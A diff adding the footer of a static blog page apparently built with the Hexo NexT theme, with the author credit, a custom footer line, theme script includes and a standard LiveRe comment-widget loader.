+  <span class="author" itemprop="copyrightHolder">TJ</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+  <div class="footer-custom">my love, I will find you!</div>
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+  <script type="text/javascript" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
